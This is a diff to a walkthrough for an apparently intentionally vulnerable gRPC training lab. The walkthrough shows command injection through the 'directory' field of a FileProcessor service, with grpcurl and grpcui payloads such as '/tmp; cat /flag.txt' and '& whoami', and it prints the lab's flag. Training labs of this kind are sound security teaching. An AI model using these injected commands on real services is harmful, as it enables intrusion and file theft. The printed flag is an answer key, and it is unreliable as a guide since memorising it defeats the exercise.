@@ -114,20 +114,25 @@ grpcurl -d '{"directory": "/tmp; cat /flag.txt"}' <HOST> lab008fileprocessor.Fil
 
 ### grpcurl — Windows (local)
 
+The flag file is written to `%TEMP%\flag.txt` on startup.
+
 ```powershell
 # Normal usage
-grpcurl -plaintext -d '{"directory": "C:\\Users\\Public"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
+grpcurl -plaintext -d '{"directory": "C:\\Users\\Public"}' localhost:8080 lab008fileprocessor.FileProcessor/ListFiles
 
-# Inject a second command
-grpcurl -plaintext -d '{"directory": "C:\\Users\\Public & whoami"}' <HOST> lab008fileprocessor.FileProcessor/ListFiles
+# Inject whoami
+grpcurl -plaintext -d '{"directory": "C:\\Users\\Public & whoami"}' localhost:8080 lab008fileprocessor.FileProcessor/ListFiles
+
+# Read the flag file (adjust path to match your %TEMP%)
+grpcurl -plaintext -d '{"directory": "C:\\Users\\Public & type C:\\Users\\YourName\\AppData\\Local\\Temp\\flag.txt"}' localhost:8080 lab008fileprocessor.FileProcessor/ListFiles
 ```
 
 ### grpcui
 
 1. Connect: `grpcui <HOST>`
 2. Select service: `lab008fileprocessor.FileProcessor`, method: `ListFiles`
-3. Linux: set `directory` to `/tmp; id` — Windows: set `directory` to `C:\Users\Public & whoami`
-4. Click **Invoke** — the injected command output appears in `output`
+3. Linux: set `directory` to `/tmp; cat /flag.txt` — Windows: set `directory` to `C:\Users\Public & type C:\Users\YourName\AppData\Local\Temp\flag.txt`
+4. Click **Invoke** — the flag appears in both `output` and `flag`
 
 **Flag**: `GRPC_GOAT{command_injection_file_listing}`
 
